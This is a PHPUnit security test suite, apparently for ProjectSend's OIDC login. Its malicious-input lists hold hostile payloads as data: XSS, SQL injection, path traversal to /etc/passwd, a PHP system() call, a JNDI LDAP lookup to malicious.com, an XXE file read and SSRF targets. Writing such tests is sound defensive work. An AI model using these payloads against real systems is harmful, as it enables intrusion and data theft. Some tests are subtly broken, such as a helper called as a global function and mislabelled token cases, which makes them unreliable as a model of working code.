<?php
/**
 * Security Audit Test Suite for OIDC Implementation
 * 
 * This comprehensive security test suite validates the OIDC integration
 * against common security vulnerabilities and implements security best practices.
 * 
 * @package ProjectSend
 * @subpackage Tests\Security
 */

require_once dirname(__FILE__) . '/../../vendor/autoload.php';
require_once dirname(__FILE__) . '/../../includes/classes/class.oidc.php';

use PHPUnit\Framework\TestCase;
use ProjectSend\Classes\OIDC\OIDCAuthentication;
use ProjectSend\Classes\OIDC\SecurityValidator;

class SecurityAuditTest extends TestCase
{
    private $oidcAuth;
    private $securityValidator;
    private $mockConfig;
    
    protected function setUp(): void
    {
        parent::setUp();
        
        $this->mockConfig = [
            'oidc_enabled' => true,
            'oidc_provider_url' => 'https://test-keycloak.example.com/realms/test',
            'oidc_client_id' => 'test-client',
            'oidc_client_secret' => 'test-secret-123456789',
            'oidc_redirect_uri' => 'https://test-projectsend.example.com/oidc-callback.php',
            'oidc_scopes' => 'openid profile email',
            'oidc_security' => [
                'require_https' => true,
                'validate_state' => true,
                'validate_nonce' => true,
                'token_encryption' => true,
                'audit_logging' => true,
                'csrf_protection' => true
            ]
        ];
        
        $this->oidcAuth = new OIDCAuthentication($this->mockConfig);
        $this->securityValidator = new SecurityValidator($this->mockConfig);
    }
    
    /**
     * Test HTTPS enforcement
     */
    public function testHTTPSEnforcement()
    {
        // Test that HTTP URLs are rejected when HTTPS is required
        $_SERVER['HTTPS'] = 'off';
        $_SERVER['HTTP_HOST'] = 'test-projectsend.example.com';
        $_SERVER['REQUEST_URI'] = '/login.php';
        
        $this->expectException(\SecurityException::class);
        $this->expectExceptionMessage('HTTPS required');
        
        $this->securityValidator->enforceHTTPS();
    }
    
    /**
     * Test against Cross-Site Request Forgery (CSRF)
     */
    public function testCSRFProtection()
    {
        // Test state parameter generation and validation
        $state = $this->oidcAuth->generateState();
        $this->assertGreaterThanOrEqual(32, strlen($state));
        
        // Test state validation
        $this->assertTrue($this->oidcAuth->validateState($state, $state));
        $this->assertFalse($this->oidcAuth->validateState($state, 'malicious-state'));
        
        // Test missing state parameter
        $this->assertFalse($this->oidcAuth->validateState($state, null));
        $this->assertFalse($this->oidcAuth->validateState($state, ''));
    }
    
    /**
     * Test against authorization code injection attacks
     */
    public function testAuthorizationCodeInjection()
    {
        // Test malicious authorization codes
        $maliciousCodes = [
            '../../../etc/passwd',
            '<script>alert("xss")</script>',
            'SELECT * FROM users',
            '../../admin.php',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '\x00\x01\x02'
        ];
        
        foreach ($maliciousCodes as $maliciousCode) {
            $result = $this->oidcAuth->validateAuthorizationCode($maliciousCode);
            $this->assertFalse($result['valid'], "Malicious code should be rejected: " . $maliciousCode);
        }
        
        // Test valid authorization code format
        $validCode = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.validcode.signature';
        $result = $this->oidcAuth->validateAuthorizationCode($validCode);
        $this->assertTrue($result['valid']);
    }
    
    /**
     * Test JWT token tampering detection
     */
    public function testJWTTamperingDetection()
    {
        // Create a mock valid JWT
        $header = base64url_encode(json_encode(['typ' => 'JWT', 'alg' => 'RS256']));
        $payload = base64url_encode(json_encode([
            'iss' => $this->mockConfig['oidc_provider_url'],
            'aud' => $this->mockConfig['oidc_client_id'],
            'sub' => 'user-123',
            'exp' => time() + 3600,
            'iat' => time()
        ]));
        $signature = 'valid-signature-hash';
        $validToken = $header . '.' . $payload . '.' . $signature;
        
        // Test tampered payload
        $tamperedPayload = base64url_encode(json_encode([
            'iss' => $this->mockConfig['oidc_provider_url'],
            'aud' => $this->mockConfig['oidc_client_id'],
            'sub' => 'admin-user', // tampered
            'exp' => time() + 3600,
            'iat' => time()
        ]));
        $tamperedToken = $header . '.' . $tamperedPayload . '.' . $signature;
        
        // Signature validation should fail for tampered token
        $this->assertFalse($this->securityValidator->validateJWTSignature($tamperedToken));
        
        // Test completely malformed tokens
        $malformedTokens = [
            'not.a.jwt',
            'too.few.parts',
            'too.many.parts.here.extra',
            '',
            'null',
            '<script>alert("xss")</script>'
        ];
        
        foreach ($malformedTokens as $malformedToken) {
            $this->assertFalse(
                $this->securityValidator->validateJWTFormat($malformedToken),
                "Malformed token should be rejected: " . $malformedToken
            );
        }
    }
    
    /**
     * Test against timing attacks on token validation
     */
    public function testTimingAttackPrevention()
    {
        $validToken = 'valid-token-hash';
        $invalidToken = 'invalid-token-hash';
        
        // Measure timing for valid and invalid tokens
        $validTimings = [];
        $invalidTimings = [];
        
        for ($i = 0; $i < 10; $i++) {
            $start = microtime(true);
            $this->securityValidator->constantTimeTokenValidation($validToken, $validToken);
            $validTimings[] = microtime(true) - $start;
            
            $start = microtime(true);
            $this->securityValidator->constantTimeTokenValidation($validToken, $invalidToken);
            $invalidTimings[] = microtime(true) - $start;
        }
        
        // Calculate average timings
        $avgValidTime = array_sum($validTimings) / count($validTimings);
        $avgInvalidTime = array_sum($invalidTimings) / count($invalidTimings);
        
        // Timing difference should be minimal (within 10% tolerance)
        $timingDifference = abs($avgValidTime - $avgInvalidTime) / max($avgValidTime, $avgInvalidTime);
        $this->assertLessThan(0.1, $timingDifference, 'Timing attack vulnerability detected');
    }
    
    /**
     * Test input sanitization and validation
     */
    public function testInputSanitization()
    {
        $maliciousInputs = [
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '<?php system("ls"); ?>',
            '${jndi:ldap://malicious.com/a}',
            '../../../etc/passwd',
            'SELECT * FROM users WHERE 1=1',
            'UNION SELECT password FROM admin_users',
            '\x00\x01\x02\xFF',
            '"><img src=x onerror=alert(1)>',
            'eval("malicious code")'
        ];
        
        foreach ($maliciousInputs as $maliciousInput) {
            $sanitized = $this->securityValidator->sanitizeInput($maliciousInput);
            
            // Check that dangerous characters are escaped or removed
            $this->assertStringNotContainsString('<script', $sanitized);
            $this->assertStringNotContainsString('javascript:', $sanitized);
            $this->assertStringNotContainsString('<?php', $sanitized);
            $this->assertStringNotContainsString('SELECT', strtoupper($sanitized));
            $this->assertStringNotContainsString('UNION', strtoupper($sanitized));
        }
    }
    
    /**
     * Test session security measures
     */
    public function testSessionSecurity()
    {
        // Test secure session configuration
        $this->assertTrue(ini_get('session.cookie_secure') || !empty($_SERVER['HTTPS']));
        $this->assertTrue(ini_get('session.cookie_httponly'));
        $this->assertEquals('strict', ini_get('session.cookie_samesite'));
        
        // Test session regeneration on authentication
        $oldSessionId = session_id();
        $this->oidcAuth->regenerateSessionOnAuth();
        $newSessionId = session_id();
        $this->assertNotEquals($oldSessionId, $newSessionId);
        
        // Test session data encryption
        $sensitiveData = ['access_token' => 'secret-token', 'refresh_token' => 'refresh-secret'];
        $encryptedData = $this->securityValidator->encryptSessionData($sensitiveData);
        $this->assertNotEquals($sensitiveData, $encryptedData);
        
        $decryptedData = $this->securityValidator->decryptSessionData($encryptedData);
        $this->assertEquals($sensitiveData, $decryptedData);
    }
    
    /**
     * Test rate limiting for authentication attempts
     */
    public function testRateLimiting()
    {
        $clientIP = '192.168.1.100';
        $username = 'test.user';
        
        // Test normal authentication attempts
        for ($i = 1; $i <= 3; $i++) {
            $this->assertTrue($this->securityValidator->isRateLimitOk($clientIP, $username));
            $this->securityValidator->recordAuthAttempt($clientIP, $username, false);
        }
        
        // Test rate limiting kicks in after too many failed attempts
        for ($i = 1; $i <= 5; $i++) {
            $this->securityValidator->recordAuthAttempt($clientIP, $username, false);
        }
        
        $this->assertFalse($this->securityValidator->isRateLimitOk($clientIP, $username));
        
        // Test successful authentication resets counter
        $this->securityValidator->recordAuthAttempt($clientIP, $username, true);
        $this->assertTrue($this->securityValidator->isRateLimitOk($clientIP, $username));
    }
    
    /**
     * Test password and secret strength requirements
     */
    public function testPasswordStrengthValidation()
    {
        // Test weak client secrets
        $weakSecrets = [
            'password',
            '123456',
            'qwerty',
            'secret',
            'admin',
            '12345678',
            'password123'
        ];
        
        foreach ($weakSecrets as $weakSecret) {
            $this->assertFalse(
                $this->securityValidator->validateClientSecretStrength($weakSecret),
                "Weak secret should be rejected: " . $weakSecret
            );
        }
        
        // Test strong client secret
        $strongSecret = 'Str0ng-Cl13nt-S3cr3t-W1th-Sp3c14l-Ch4r5!@#$';
        $this->assertTrue($this->securityValidator->validateClientSecretStrength($strongSecret));
    }
    
    /**
     * Test against XML External Entity (XXE) attacks
     */
    public function testXXEPrevention()
    {
        // Test malicious XML payloads
        $maliciousXML = '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>';
        
        $this->assertFalse($this->securityValidator->isXMLSafe($maliciousXML));
        
        // Test safe XML
        $safeXML = '<?xml version="1.0" encoding="UTF-8"?>
        <root>
            <element>safe content</element>
        </root>';
        
        $this->assertTrue($this->securityValidator->isXMLSafe($safeXML));
    }
    
    /**
     * Test against Server-Side Request Forgery (SSRF)
     */
    public function testSSRFPrevention()
    {
        // Test malicious URLs
        $maliciousURLs = [
            'http://localhost/admin',
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'ftp://internal-server/',
            'gopher://internal-host:80/',
            'dict://localhost:11211/stats'
        ];
        
        foreach ($maliciousURLs as $maliciousURL) {
            $this->assertFalse(
                $this->securityValidator->isURLSafeForSSRF($maliciousURL),
                "SSRF vulnerable URL should be rejected: " . $maliciousURL
            );
        }
        
        // Test safe external URLs
        $safeURLs = [
            'https://auth.example.com/.well-known/openid_configuration',
            'https://keycloak.company.com/auth/realms/production',
            'https://login.microsoftonline.com/common/v2.0/.well-known/openid_configuration'
        ];
        
        foreach ($safeURLs as $safeURL) {
            $this->assertTrue($this->securityValidator->isURLSafeForSSRF($safeURL));
        }
    }
    
    /**
     * Test cryptographic security
     */
    public function testCryptographicSecurity()
    {
        // Test encryption key generation
        $key = $this->securityValidator->generateEncryptionKey();
        $this->assertEquals(32, strlen($key)); // 256-bit key
        
        // Test encryption/decryption
        $plaintext = 'sensitive-data-to-encrypt';
        $encrypted = $this->securityValidator->encrypt($plaintext);
        $this->assertNotEquals($plaintext, $encrypted);
        
        $decrypted = $this->securityValidator->decrypt($encrypted);
        $this->assertEquals($plaintext, $decrypted);
        
        // Test that encryption is not deterministic (uses random IV)
        $encrypted1 = $this->securityValidator->encrypt($plaintext);
        $encrypted2 = $this->securityValidator->encrypt($plaintext);
        $this->assertNotEquals($encrypted1, $encrypted2);
        
        // Test hash functions use secure algorithms
        $hash = $this->securityValidator->secureHash('data-to-hash');
        $this->assertEquals(64, strlen($hash)); // SHA-256 produces 64 character hex string
    }
    
    /**
     * Test audit logging security
     */
    public function testAuditLoggingSecurity()
    {
        // Test that sensitive data is not logged
        $logEntry = [
            'event' => 'authentication_success',
            'username' => 'test.user',
            'client_secret' => 'should-not-be-logged',
            'access_token' => 'should-not-be-logged',
            'password' => 'should-not-be-logged'
        ];
        
        $sanitizedEntry = $this->securityValidator->sanitizeLogEntry($logEntry);
        
        $this->assertArrayNotHasKey('client_secret', $sanitizedEntry);
        $this->assertArrayNotHasKey('access_token', $sanitizedEntry);
        $this->assertArrayNotHasKey('password', $sanitizedEntry);
        $this->assertArrayHasKey('username', $sanitizedEntry);
        $this->assertArrayHasKey('event', $sanitizedEntry);
        
        // Test log injection prevention
        $maliciousLogData = "normal data\n[MALICIOUS] fake admin login\nanother line";
        $sanitizedLogData = $this->securityValidator->sanitizeLogData($maliciousLogData);
        $this->assertStringNotContainsString("\n", $sanitizedLogData);
        $this->assertStringNotContainsString("\r", $sanitizedLogData);
    }
    
    /**
     * Test token storage security
     */
    public function testTokenStorageSecurity()
    {
        $accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.access.token';
        $refreshToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.refresh.token';
        
        // Test tokens are encrypted before storage
        $encryptedTokens = $this->securityValidator->encryptTokensForStorage([
            'access_token' => $accessToken,
            'refresh_token' => $refreshToken
        ]);
        
        $this->assertNotEquals($accessToken, $encryptedTokens['access_token']);
        $this->assertNotEquals($refreshToken, $encryptedTokens['refresh_token']);
        
        // Test tokens can be decrypted correctly
        $decryptedTokens = $this->securityValidator->decryptTokensFromStorage($encryptedTokens);
        $this->assertEquals($accessToken, $decryptedTokens['access_token']);
        $this->assertEquals($refreshToken, $decryptedTokens['refresh_token']);
        
        // Test token expiration tracking
        $this->assertTrue($this->securityValidator->isTokenExpired(time() - 3600)); // expired
        $this->assertFalse($this->securityValidator->isTokenExpired(time() + 3600)); // valid
    }
    
    /**
     * Test Content Security Policy headers
     */
    public function testContentSecurityPolicy()
    {
        $headers = $this->securityValidator->getSecurityHeaders();
        
        $this->assertArrayHasKey('Content-Security-Policy', $headers);
        $this->assertStringContainsString("default-src 'self'", $headers['Content-Security-Policy']);
        $this->assertStringContainsString("script-src 'self'", $headers['Content-Security-Policy']);
        $this->assertStringNotContainsString("'unsafe-eval'", $headers['Content-Security-Policy']);
        $this->assertStringNotContainsString("'unsafe-inline'", $headers['Content-Security-Policy']);
        
        // Test other security headers
        $this->assertArrayHasKey('X-Frame-Options', $headers);
        $this->assertEquals('DENY', $headers['X-Frame-Options']);
        
        $this->assertArrayHasKey('X-Content-Type-Options', $headers);
        $this->assertEquals('nosniff', $headers['X-Content-Type-Options']);
        
        $this->assertArrayHasKey('Referrer-Policy', $headers);
        $this->assertEquals('strict-origin-when-cross-origin', $headers['Referrer-Policy']);
    }
    
    /**
     * Test for information disclosure vulnerabilities
     */
    public function testInformationDisclosurePrevention()
    {
        // Test error messages don't reveal sensitive information
        $sanitizedError = $this->securityValidator->sanitizeErrorMessage(
            'Database connection failed: SQLSTATE[28000] [1045] Access denied for user \'projectsend\'@\'localhost\' (using password: YES)'
        );
        
        $this->assertStringNotContainsString('SQLSTATE', $sanitizedError);
        $this->assertStringNotContainsString('projectsend', $sanitizedError);
        $this->assertStringNotContainsString('localhost', $sanitizedError);
        
        // Test configuration doesn't expose sensitive values
        $publicConfig = $this->oidcAuth->getPublicConfiguration();
        $this->assertArrayNotHasKey('oidc_client_secret', $publicConfig);
        $this->assertArrayNotHasKey('database_password', $publicConfig);
        $this->assertArrayNotHasKey('encryption_key', $publicConfig);
    }
    
    /**
     * Test compliance with security standards
     */
    public function testSecurityCompliance()
    {
        // Test OWASP compliance checks
        $owaspChecks = $this->securityValidator->runOWASPChecks();
        
        $this->assertTrue($owaspChecks['injection_protection']);
        $this->assertTrue($owaspChecks['broken_authentication_prevention']);
        $this->assertTrue($owaspChecks['sensitive_data_exposure_prevention']);
        $this->assertTrue($owaspChecks['xml_external_entities_prevention']);
        $this->assertTrue($owaspChecks['broken_access_control_prevention']);
        $this->assertTrue($owaspChecks['security_misconfiguration_prevention']);
        $this->assertTrue($owaspChecks['cross_site_scripting_prevention']);
        $this->assertTrue($owaspChecks['insecure_deserialization_prevention']);
        $this->assertTrue($owaspChecks['components_with_known_vulnerabilities_check']);
        $this->assertTrue($owaspChecks['insufficient_logging_monitoring_prevention']);
        
        // Test SOC 2 compliance requirements
        $soc2Checks = $this->securityValidator->runSOC2Checks();
        $this->assertTrue($soc2Checks['access_controls']);
        $this->assertTrue($soc2Checks['audit_logging']);
        $this->assertTrue($soc2Checks['data_encryption']);
        $this->assertTrue($soc2Checks['incident_response']);
    }
    
    /**
     * Test vulnerability scanning
     */
    public function testVulnerabilityScanning()
    {
        // Test for common vulnerabilities
        $vulnScan = $this->securityValidator->scanForVulnerabilities();
        
        $this->assertEmpty($vulnScan['critical_vulnerabilities']);
        $this->assertEmpty($vulnScan['high_vulnerabilities']);
        
        // Test dependency vulnerabilities
        $depScan = $this->securityValidator->scanDependencies();
        $this->assertEmpty($depScan['vulnerable_dependencies']);
    }
    
    /**
     * Helper function for base64url encoding
     */
    private function base64url_encode($data)
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }
    
    /**
     * Test cleanup
     */
    protected function tearDown(): void
    {
        // Clean up any test data
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_destroy();
        }
        parent::tearDown();
    }
}

/**
 * Custom exception for security-related errors
 */
class SecurityException extends Exception
{
    public function __construct($message = "", $code = 0, Throwable $previous = null)
    {
        parent::__construct("Security violation: " . $message, $code, $previous);
    }
}